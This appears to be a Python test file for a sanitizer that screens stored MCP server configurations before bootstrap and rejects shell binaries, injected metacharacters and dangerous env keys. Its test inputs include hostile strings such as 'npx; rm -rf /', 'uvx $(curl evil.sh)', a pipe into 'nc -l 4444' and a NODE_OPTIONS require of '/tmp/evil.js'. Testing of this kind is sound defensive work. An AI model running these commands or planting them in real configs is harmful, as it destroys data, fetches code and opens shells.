"""bootstrap 加载存量 MCP 配置的命令/env 纵深防御校验测试。

背景：core/bootstrap.py._init_mcp 会加载 WORKSPACE_DIR/mcp_configs/*.json 里的
connections 并直接 start_all，修复前已被投毒的存量配置会在每次启动时执行任意
命令（RCE）。修复后启动前必须先经过 _sanitize_mcp_configs（复用
security/mcp_command_policy 的二进制白名单 + env 键黑名单），校验失败的
server 跳过不启动（fail-closed）。
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.bootstrap import AgentCoreBootstrapper

_sanitize = AgentCoreBootstrapper._sanitize_mcp_configs


def _rejected_by_name(servers: dict) -> dict[str, str]:
    """返回 {server_name: reason} 形式的拒绝映射，便于断言。"""
    _clean, rejected = _sanitize(servers)
    return dict(rejected)


def test_malicious_shell_binary_is_filtered():
    """不在白名单的二进制（bash/sh）必须被剔除。"""
    clean, rejected = _sanitize({
        "evil1": {"command": "bash", "args": ["-c", "id"]},
        "evil2": {"command": "/bin/sh"},
    })
    assert clean == {}
    reasons = dict(rejected)
    assert "evil1" in reasons and "evil2" in reasons
    assert "不在允许的二进制列表内" in reasons["evil1"]


def test_shell_metacharacters_are_filtered():
    """含 shell 元字符（; / && / $() 等）的 command 必须被剔除。"""
    clean, rejected = _sanitize({
        "semi": {"command": "npx; rm -rf /"},
        "dollar": {"command": "uvx $(curl evil.sh)"},
        "pipe": {"command": "node -e 'x' | nc -l 4444"},
    })
    assert clean == {}
    reasons = dict(rejected)
    for name in ("semi", "dollar", "pipe"):
        assert name in reasons
        assert "非法字符" in reasons[name]


def test_malicious_env_key_is_filtered():
    """危险 env 键（NODE_OPTIONS 等注入前缀）必须被剔除。"""
    clean, rejected = _sanitize({
        "nodeinj": {
            "command": "npx",
            "args": ["-y", "some-server"],
            "env": {"NODE_OPTIONS": "--require=/tmp/evil.js"},
        },
    })
    assert clean == {}
    reasons = dict(rejected)
    assert "nodeinj" in reasons
    assert "禁止的前缀" in reasons["nodeinj"]


def test_legit_npx_and_uvx_are_kept():
    """合法 npx / uvx（含完整路径）必须保留。"""
    clean, rejected = _sanitize({
        "npx_ok": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-github"],
            "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "t"},
        },
        "uvx_ok": {
            "command": "/usr/bin/uvx",
            "args": ["mcp-server-git"],
            "env": {"UV_INDEX_URL": "https://example.com/simple"},
        },
    })
    assert rejected == []
    assert set(clean) == {"npx_ok", "uvx_ok"}


def test_empty_input_returns_empty():
    """空输入返回空集合，不抛异常。"""
    clean, rejected = _sanitize({})
    assert clean == {}
    assert rejected == []


def test_server_without_command_is_filtered_fail_closed():
    """stdio server 缺少 command 字段必须被剔除（fail-closed）。"""
    clean, rejected = _sanitize({
        "nocommand": {"args": ["-y", "whatever"]},
        "empty": {},
    })
    assert clean == {}
    reasons = dict(rejected)
    assert "nocommand" in reasons and "empty" in reasons


def test_non_string_command_is_filtered():
    """command 为非字符串类型（投毒 JSON 常见形态）必须被剔除。"""
    clean, rejected = _sanitize({
        "listcmd": {"command": ["npx", "-y", "evil"]},
        "intcmd": {"command": 1},
    })
    assert clean == {}
    assert len(rejected) == 2


def test_env_not_a_dict_is_filtered():
    """env 为非对象类型必须被剔除（fail-closed）。"""
    clean, rejected = _sanitize({
        "badenv": {"command": "npx", "env": "NODE_OPTIONS=x"},
    })
    assert clean == {}
    assert "badenv" in dict(rejected)


def test_remote_transport_passes_without_command():
    """sse / streamable-http 传输不执行本地二进制，不要求 command。"""
    clean, rejected = _sanitize({
        "remote": {"transport": "sse", "url": "http://localhost:8082/sse"},
    })
    assert rejected == []
    assert set(clean) == {"remote"}


def test_non_dict_config_is_filtered():
    """非对象 server 配置必须被剔除。"""
    clean, rejected = _sanitize({"weird": "npx -y evil"})
    assert clean == {}
    assert "weird" in dict(rejected)
